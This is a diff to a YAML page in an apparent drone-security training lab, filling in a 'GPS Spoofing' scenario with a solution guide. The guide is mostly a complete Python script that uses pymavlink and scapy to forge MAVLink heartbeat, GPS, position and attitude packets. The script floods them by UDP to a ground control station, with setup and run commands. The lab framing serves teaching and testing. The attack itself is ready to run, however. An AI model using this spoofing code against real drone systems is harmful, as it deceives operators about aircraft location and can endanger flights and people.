@@ -1,19 +1,165 @@
 title: GPS Spoofing
-description: Scenario Under development
+order: 2
+description: Spoofing the drone's GPS data to mislead the Ground Control Station (GCS) about the drone's actual location.
 breadcrumb:
   - text: Attack Scenarios
     link: /attacks
-  - text: Protocol Tampering
+  - text: Reconnaissance
   - text: GPS Spoofing
 
 sections:
   - title: Description
     content: |
-      <span class="alert-warning">🚧 Scenario Under development</span>
+      GPS spoofing involves sending false GPS data to the Ground Control Station (GCS) to mislead 
+      it about the drone's actual location. This can cause the operator to make incorrect decisions 
+      based on the spoofed data.
 
   - title: Resources
-    content: []
+    content:
+      - text: MAVLink Protocol
+        link: https://mavlink.io/en/
+      - text: PyMAVLink Documentation
+        link: https://www.ardusub.com/developers/pymavlink.html
 
   - title: Solution Guide
     collapsible: true
-    steps: []
+    steps:
+      - title: Step 1. Setup
+        description: |
+          Ensure you have Python and the necessary libraries installed:
+          ```sudo apt-get update
+          sudo apt-get install python3 python3-pip
+          pip3 install pymavlink scapy
+          ```
+
+      - title: Step 2. Create the Script
+        description: |
+          Create a Python script named `gps-spoofing.py` and paste the following code:
+          ```from pymavlink import mavutil
+          from scapy.all import *
+          import time
+
+          def create_heartbeat():
+              """
+              Create a MAVLink heartbeat message indicating the drone is flying.
+              """
+              mav = mavutil.mavlink.MAVLink(None)
+              mav.srcSystem = 1
+              mav.srcComponent = 1
+
+              heartbeat = mav.heartbeat_encode(
+                  type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
+                  autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
+                  base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
+                  custom_mode=3,  # Custom mode to indicate flying (ArduCopter: GUIDED mode)
+                  system_status=mavutil.mavlink.MAV_STATE_ACTIVE
+              )
+              
+              return heartbeat.pack(mav)
+
+          def create_gps_raw_int():
+              """
+              Create a MAVLink GPS_RAW_INT message with in-flight coordinates.
+              """
+              mav = mavutil.mavlink.MAVLink(None)
+              mav.srcSystem = 1
+              mav.srcComponent = 1
+
+              gps_raw_int = mav.gps_raw_int_encode(
+                  time_usec=int(time.time() * 1e6),
+                  fix_type=3,  # 3D fix
+                  lat=473566100,  # Latitude (in degrees * 1e7)
+                  lon=854619300,  # Longitude (in degrees * 1e7)
+                  alt=1500,  # Altitude (in meters * 1000)
+                  eph=100,  # GPS HDOP horizontal dilution of position
+                  epv=100,  # GPS VDOP vertical dilution of position
+                  vel=500,  # GPS ground speed (m/s * 100)
+                  cog=0,  # Course over ground (degrees * 100)
+                  satellites_visible=10  # Number of satellites visible
+              )
+
+              return gps_raw_int.pack(mav)
+
+          def create_global_position_int():
+              """
+              Create a MAVLink GLOBAL_POSITION_INT message to simulate in-flight drone global position.
+              """
+              mav = mavutil.mavlink.MAVLink(None)
+              mav.srcSystem = 1
+              mav.srcComponent = 1
+
+              global_position_int = mav.global_position_int_encode(
+                  time_boot_ms=int(time.time() * 1e3) % 4294967295,  # Time since boot in milliseconds, using modulo to ensure valid range
+                  lat=473566100,  # Latitude (in degrees * 1e7)
+                  lon=854619300,  # Longitude (in degrees * 1e7)
+                  alt=1500 * 1000,  # Altitude (in millimeters)
+                  relative_alt=1500 * 1000,  # Altitude relative to ground (in millimeters)
+                  vx=0,  # GPS ground speed in cm/s
+                  vy=0,  # GPS ground speed in cm/s
+                  vz=0,  # GPS ground speed in cm/s
+                  hdg=0  # Heading (in degrees * 100)
+              )
+
+              return global_position_int.pack(mav)
+
+          def create_attitude():
+              """
+              Create a MAVLink ATTITUDE message to simulate in-flight drone attitude.
+              """
+              mav = mavutil.mavlink.MAVLink(None)
+              mav.srcSystem = 1
+              mav.srcComponent = 1
+
+              attitude = mav.attitude_encode(
+                  time_boot_ms=int(time.time() * 1e3) % 4294967295,  # Time since boot in milliseconds, using modulo to ensure valid range
+                  roll=0.1,  # Roll angle (rad)
+                  pitch=0.1,  # Pitch angle (rad)
+                  yaw=1.0,  # Yaw angle (rad)
+                  rollspeed=0.01,  # Roll angular speed (rad/s)
+                  pitchspeed=0.01,  # Pitch angular speed (rad/s)
+                  yawspeed=0.1  # Yaw angular speed (rad/s)
+              )
+
+              return attitude.pack(mav)
+
+          def send_mavlink_packet(packet_data, target_ip, target_port):
+              """
+              Send a MAVLink packet using Scapy.
+              """
+              packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
+              send(packet)
+
+          if __name__ == "__main__":
+              if len(sys.argv) != 2:
+                  print("Usage: python gps_spoof.py <ip:port>")
+                  sys.exit(1)
+
+              target = sys.argv[1]
+              target_ip, target_port = target.split(':')
+              target_port = int(target_port)
+
+              while True:
+                  heartbeat_packet = create_heartbeat()
+                  gps_packet = create_gps_raw_int()
+                  global_position_packet = create_global_position_int()
+                  attitude_packet = create_attitude()
+
+                  send_mavlink_packet(heartbeat_packet, target_ip, target_port)
+                  send_mavlink_packet(gps_packet, target_ip, target_port)
+                  send_mavlink_packet(global_position_packet, target_ip, target_port)
+                  send_mavlink_packet(attitude_packet, target_ip, target_port)
+                  
+                  print(f"Sent heartbeat, GPS, global position, and attitude packets to {target_ip}:{target_port}")
+
+          ```
+
+      - title: Step 3. Run the Script
+        description: |
+          Execute the script with sudo and the target GCS IP and port:
+          ```sudo python gps-spoofing.py <ip:port>
+          ```
+          Replace `<ip:port>` with the actual IP address and port of the QGroundControl App using `10.13.0.6:14550` or the GCS (MAVProxy) using `192.168.13.14:14550`/`10.13.0.4:14550`.
+
+      - title: Step 4. Monitor the Effects
+        description: |
+          Observe the GCS to see the spoofed GPS data being displayed. The drone's location will appear different from its actual state.
